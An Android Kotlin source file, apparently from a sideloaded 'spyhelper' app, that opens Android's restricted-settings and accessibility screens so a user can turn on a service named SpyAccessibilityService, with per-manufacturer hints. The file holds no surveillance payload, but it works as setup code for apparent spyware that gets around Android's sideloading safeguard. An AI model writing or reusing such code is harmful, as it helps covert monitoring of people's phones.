package com.phaohn.spyhelper

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings

object OemSettingsNavigator {

    private const val ACTION_MANAGE_RESTRICTED_SETTING = "android.settings.MANAGE_RESTRICTED_SETTING"
    private const val ACTION_ACCESSIBILITY_DETAILS = "android.settings.ACCESSIBILITY_DETAILS_SETTINGS"
    private const val EXTRA_COMPONENT_NAME = "android.intent.extra.COMPONENT_NAME"

    fun manufacturerLabel(): String = Build.MANUFACTURER.ifBlank { "Android" }

    fun manufacturerHint(context: Context): String {
        val m = Build.MANUFACTURER.lowercase()
        return when {
            m.contains("samsung") -> context.getString(R.string.a11y_hint_samsung)
            m.contains("xiaomi") || m.contains("redmi") || m.contains("poco") ->
                context.getString(R.string.a11y_hint_xiaomi)
            m.contains("oppo") || m.contains("realme") || m.contains("oneplus") ->
                context.getString(R.string.a11y_hint_oppo)
            m.contains("vivo") -> context.getString(R.string.a11y_hint_vivo)
            m.contains("motorola") || m.contains("lenovo") ->
                context.getString(R.string.a11y_hint_motorola)
            m.contains("huawei") || m.contains("honor") ->
                context.getString(R.string.a11y_hint_huawei)
            m.contains("google") -> context.getString(R.string.a11y_hint_pixel)
            else -> context.getString(R.string.a11y_hint_generic)
        }
    }

    fun isPlayStoreInstall(context: Context): Boolean {
        val installer = installSource(context) ?: return false
        return installer == "com.android.vending"
    }

    fun installSource(context: Context): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                context.packageManager
                    .getInstallSourceInfo(context.packageName)
                    .installingPackageName
            } else {
                @Suppress("DEPRECATION")
                context.packageManager.getInstallerPackageName(context.packageName)
            }
        } catch (_: Exception) {
            null
        }
    }

    /** Bước kích hoạt: user thử bật Trợ năng → Android hiện hộp thoại chặn → sau đó mới có menu ⋮. */
    fun openAccessibilityServiceDetails(context: Context): Boolean {
        val component = ComponentName(context, SpyAccessibilityService::class.java)
        val flattened = component.flattenToString()
        return startFirst(
            context,
            listOf(
                Intent(ACTION_ACCESSIBILITY_DETAILS).apply {
                    putExtra(EXTRA_COMPONENT_NAME, flattened)
                    putExtra(Intent.EXTRA_COMPONENT_NAME, component)
                },
                Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
            ),
        )
    }

    fun openRestrictedSettings(context: Context): Boolean {
        return startFirst(context, buildRestrictedIntents(context.packageName))
    }

    fun openAppDetails(context: Context): Boolean {
        return startFirst(context, buildAppDetailsIntents(context.packageName))
    }

    fun openAccessibilitySettings(context: Context): Boolean {
        return startFirst(
            context,
            listOf(
                Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
                Intent(Settings.ACTION_SETTINGS),
            ),
        )
    }

    private fun buildRestrictedIntents(pkg: String): List<Intent> {
        val intents = mutableListOf<Intent>()
        val m = Build.MANUFACTURER.lowercase()
        val uri = Uri.parse("package:$pkg")

        intents += Intent(ACTION_MANAGE_RESTRICTED_SETTING).apply {
            putExtra(Intent.EXTRA_PACKAGE_NAME, pkg)
            putExtra("package", pkg)
            data = uri
        }

        intents += ComponentName("com.android.settings", "com.android.settings.Settings\$ManageRestrictedSettingActivity")
            .let { cn ->
                Intent().apply {
                    component = cn
                    putExtra(Intent.EXTRA_PACKAGE_NAME, pkg)
                    data = uri
                }
            }

        if (m.contains("xiaomi") || m.contains("redmi") || m.contains("poco")) {
            intents += Intent("miui.intent.action.APP_PERM_EDITOR").apply {
                putExtra("extra_pkgname", pkg)
            }
        }

        intents += buildAppDetailsIntents(pkg)
        return intents
    }

    private fun buildAppDetailsIntents(pkg: String): List<Intent> {
        val uri = Uri.parse("package:$pkg")
        return listOf(
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply { data = uri },
            Intent(Settings.ACTION_APPLICATION_SETTINGS),
        )
    }

    private fun startFirst(context: Context, intents: List<Intent>): Boolean {
        for (intent in intents) {
            if (safeStart(context, intent)) return true
        }
        return false
    }

    private fun safeStart(context: Context, intent: Intent): Boolean {
        return try {
            if (context !is Activity) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            true
        } catch (_: ActivityNotFoundException) {
            false
        } catch (_: Exception) {
            false
        }
    }
}